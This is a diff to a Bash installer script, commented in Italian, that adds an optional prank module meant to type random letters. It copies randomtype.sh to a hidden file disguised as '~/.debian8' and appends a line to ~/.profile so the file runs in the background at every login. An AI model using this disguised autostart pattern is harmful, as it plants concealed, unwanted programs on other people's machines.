@@ -102,3 +102,24 @@ case "$resp" in
 		echo "SKIPPED"
 		;;
 esac
+
+
+# Scrive lettere a caso
+echo "### RANDOMTYPE"
+echo "Scrive casualmente alcune lettere a caso"
+echo -n "Lo vuoi aggiungere? [y/N] "
+read resp
+
+case "$resp" in
+	y)
+		echo -n "Installazione... "
+		cp randomtype.sh ~/.debian8
+		chmod u+x ~/.debian8
+		echo "~/.debian8 100 &" >> ~/.profile
+		echo "DONE"
+		;;
+	*)
+		echo "SKIPPED"
+		;;
+esac
+
